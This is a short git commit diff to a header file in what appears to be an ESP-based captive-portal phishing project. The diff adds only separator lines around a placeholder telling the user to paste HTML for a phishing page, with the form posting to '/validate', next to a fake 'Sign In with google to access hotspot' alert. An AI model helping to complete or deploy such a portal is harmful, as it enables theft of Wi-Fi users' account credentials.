138c00afb363e47fa89c79ce4071b35b0403ba22
theenigma017 <46239775+theenigma017@users.noreply.github.com>
2019-05-14 15:41:31 +0530

    Update site_other.h

--- esportal/site_other.h
+++ esportal/site_other.h
@@ -10,11 +10,13 @@ window.alert("Sign In with google to access hotspot");
 
 
 
+#############################################################################################
 PASTE THE HTML CODE FOR YOUR PHISHING PAGE HERE AND MODIFY THE FORM PART SUCH THAT
 
 the form action points to action="/validate"
 
 then go to the .ino file and modify the '/validate' part as required.
+#############################################################################################
 
 
 
